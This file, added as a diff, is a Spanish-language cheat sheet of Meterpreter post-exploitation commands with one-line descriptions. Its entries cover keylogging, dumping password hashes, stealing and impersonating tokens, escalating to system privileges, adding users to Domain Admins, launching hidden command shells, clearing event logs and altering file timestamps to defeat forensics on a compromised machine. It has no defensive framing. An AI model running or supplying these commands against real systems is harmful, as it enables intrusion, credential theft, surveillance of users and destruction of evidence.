@@ -1,0 +1,86 @@
+Comandos Meterpreter
+
+
+help – Abrir ayuda Meterpreter
+
+sniffer_dump interfaceID pcapname – Comience sniffer en el destino remoto.
+
+sniffer_start interfaceID packet-buffer – Comience sniffer  con una gama específica para un buffer de paquetes.
+
+sniffer_stats interfaceID – Coge la información de estadística de la interfaz que está en sniffer.
+
+sniffer_stop interfaceID – Detenga el sniffer D:
+
+add_user username password -h ip – Agregar un usuario en el destino remoto.
+
+add_group_user “Domain Admins” username -h ip – Añadir un nombre de usuario al grupo Administradores de dominio en el destino remoto.
+
+clearev – Borrar el registro de eventos en el equipo de destino.
+
+run scriptname – Ejecutar Meterpreter-basado en scripts, para obtener una lista completa de scripts/meterpreter en el directorio.
+
+sysinfo – Mostrar la información del sistema en el destino remoto.
+
+ls – Lista de archivos y carpetas en el objetivo.
+
+use priv – Cargue el privilegio de la extension para extender la librería del Meterpreter.
+
+ps – Mostrar todos los procesos en ejecución y que las cuentas estén asociadas con cada proceso.
+
+migrate PID – Migrar específicamente el proceso de ID (PID es el objetivo del proceso ID  ganado desde el comandos PS)
+
+use incognito – Cargar funciones incógnitas. (Se utiliza para robar fichas y suplantación de una máquina de destino)
+
+list_tokens -u –Lista fichas disponibles en el objetivo por el usuario.
+
+list_tokens -g – Lista fichas disponibles en el objetivo por el grupo.
+
+impersonate_token DOMAIN_NAME\\USERNAME – Hacerse pasar por una ficha disponible en el objetivo.
+
+steal_token PID – Robar las fichas disponibles para un determinado proceso y hacerse pasar por esa señal.
+
+drop_token – Deje de hacerse pasar por el token actual.
+
+getsystem – Intento de elevar los permisos de acceso a nivel de sistema a través de múltiples vectores de ataque.
+
+shell – Caer en un shell interactivo con todas las fichas disponibles.
+
+execute -f cmd.exe -i – Ejecutar cmd.exe e interactuar con él.
+
+execute -f cmd.exe -i -t – Ejecutar cmd.exe con todas las fichas disponibles.
+
+execute -f cmd.exe -i -H -t  – Ejecutar cmd.exe con todas las fichas disponibles y convertirlo en un proceso oculto.
+
+rev2self – Volver al usuario original que utilizó para poner en peligro el objetivo.
+
+reg command – Interactuar, crear, eliminar, consultar, set, y mucho más en el registro del destino.
+
+setdesktop number – Cambiar a una pantalla diferente en función de quién está conectado.
+
+screenshot – Tome una captura de pantalla de la pantalla del destino.
+
+upload file  –  Subir un archivo a la objetivo.
+
+download file – Descargar los archivos desde el objetivo.
+
+keyscan_start – detecte las pulsaciones de teclado en el destino remoto.
+
+keyscan_dump – Volcar las teclas remotas capturados en el objetivo.
+
+keyscan_stop – Deje de detectar las pulsaciones de teclado en el destino remoto.
+
+getprivs – Obtener tantos privilegios como sea posible en el objetivo.
+
+uictl enable keyboard/mouse –Toma el control del teclado y/o ratón.
+
+background – Ejecute su shell actual Meterpreter en el fondo.
+
+hashdump – Volcar todos los hashes en el objetivo.
+
+use sniffer – Cargue el módulo sniffer.
+
+sniffer_interfaces – Lista de  interfaces disponibles al objetivo.
+
+timestomp – Cambiar atributos de archivo, como fecha de creación (antiforensics medida)
+
+reboot – Reinicie el equipo de destino.
